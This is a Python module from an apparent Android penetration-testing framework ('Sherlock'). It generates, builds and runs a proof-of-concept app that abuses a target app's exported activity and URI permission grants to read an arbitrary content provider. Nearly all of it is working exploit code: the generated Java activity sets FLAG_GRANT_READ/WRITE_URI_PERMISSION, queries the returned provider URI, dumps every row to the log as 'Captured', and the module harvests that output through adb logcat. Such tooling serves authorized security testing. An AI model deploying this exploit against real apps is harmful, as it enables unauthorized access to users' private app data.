import re
import settings.utils as utils

from modules.android.app.app import App
from settings.logger import get_logger
from state.opt_enum import OptEnum
from state.opt_str import OptStr
from state.device import device_state
from state.options import option_state


log = get_logger(__name__)


class SherlockModule(App):

    def __init__(self):
        super().__init__()
        self._id = "access_to_arbitrary_base"
        self._name = "AccessToArbitraryBaseActivity"

    def register_options(self):
        option_state.add_options([
            OptStr("CONTENT_PROVIDER", [True, "Content provider URI to access", ""]),
            OptStr("PACKAGE_NAME", [True, "Target package name", ""]),
            OptStr("CLASS_NAME", [True, "Target class name (Get target class name from the manifest file)", ""]),
            OptEnum("RESULT_CODE", [True, "Result code returned to the caller", -1, [-1, 0, 1, "RESULT_OK", "RESULT_FIRST_USER", "RESULT_CANCELED"]])
        ])

    def manifest_component(self):
        return f"""<activity android:name=".{self._name}"/>
        <!-- (( placeholder )) -->"""
    
    def bind_button(self):
        return f"""binding.{self.format(self._id)}.setOnClickListener(v1 -> {{
            Intent i = {self._name}.newIntent(this);
            startActivity(i);
        }});

        // (( placeholder ))"""

    def exploit_activity(self, provider, package, classname, code):
        return f"""package sherlock.poc;

import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;

import androidx.activity.result.ActivityResultLauncher;
import androidx.activity.result.contract.ActivityResultContracts;
import androidx.appcompat.app.AppCompatActivity;

public class AccessToArbitraryBaseActivity extends AppCompatActivity {{

    public static Intent newIntent(Context packageContext) {{
        return new Intent(packageContext, AccessToArbitraryBaseActivity.class);
    }}

    @Override
    protected void onCreate(Bundle savedInstanceState) {{
        super.onCreate(savedInstanceState);

        Intent i = new Intent();
        i.setData(Uri.parse("{provider}"));
        i.setClassName("{package}", "{classname}");
        i.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION | Intent.FLAG_GRANT_WRITE_URI_PERMISSION);
        launcher.launch(i);
    }}

    ActivityResultLauncher<Intent> launcher = registerForActivityResult(
            new ActivityResultContracts.StartActivityForResult(),
            result -> {{
                if (result.getResultCode() == {code}) {{
                    Intent data = result.getData();
                    Uri providerUri = data.getData();
                    Cursor c = getContentResolver().query(
                            providerUri,
                            null,
                            null,
                            null,
                            null
                    );
                    try {{
                        if (c.getCount() == 0) {{
                            return;
                        }}
                        c.moveToFirst();
                        StringBuilder sb = new StringBuilder();
                        while (!c.isAfterLast()) {{
                            for (int i = 0; i < c.getColumnCount(); i++) {{
                                String providerData = c.getColumnName(i) + ":" + c.getString(i) + ";";
                                sb.append(providerData);
                            }}
                            c.moveToNext();
                        }}
                        Log.d("SUCCESS!!", "Captured: " + sb);
                    }} finally {{
                        c.close();
                    }}
                }}
            }}
    );
}}"""

    def button_layout(self):
        return f"""<Button
            android:id="@+id/{self._id}"
            android:layout_width="match_parent"
            android:layout_height="wrap_content"
            android:text="Access to Arbitrary - Base"/>
        <!-- (( placeholder )) -->"""

    def execute(self):
        log.debug("Executing module..")
        self.app_init()
        opts = self.get_options_value()
        app = {
            "manifest": self.manifest_component(),
            "layout": self.button_layout(),
            "bind_button": self.bind_button(),
            "activity": {
                "name": f"{self._name}.java",
                "content": self.exploit_activity(opts["CONTENT_PROVIDER"], 
                                                opts["PACKAGE_NAME"], 
                                                opts["CLASS_NAME"], 
                                                opts["RESULT_CODE"]) 
            }
        }
        log.debug("Building app..")
        build_app = self.build(app, app["activity"])
        if not build_app:
            log.error("Process failed, terminating..")
            return
        log.debug("Reading application log..")
        data = re.compile(r"Captured: .*")
        cmd = ["logcat", "--clear"]
        _ = utils.run_adb(device_state.device_id, cmd)
        cmd.pop()
        logcat = utils.run_adb(device_state.device_id, cmd, realtime=True)
        if logcat is None:
            log.error("Process failed, terminating..")
            return
        for line in logcat.stdout:
            if re.match(r"^.*java\.lang\.RuntimeException:.*Unable to start activity.*android\.content\.ActivityNotFoundException.*$", line):
                log.error(f"FAILED: Activity not found: \'{opts['CLASS_NAME']}\' on target app: \'{opts['PACKAGE_NAME']}\'")
                logcat.terminate()
                break
            elif re.match(r"^.*java\.lang\.SecurityException: Permission Denial.*$", line):
                log.error(f"FAILED: Permission denied. Can't access content provider: \'{opts['CONTENT_PROVIDER']}\'")
                logcat.terminate()
                break
            elif re.match(r"^.*SUCCESS.*$", line):
                data = data.search(line).group(0)
                log.info(f"SUCCESS: '{data}'")
                logcat.terminate()
                break
        logcat.wait()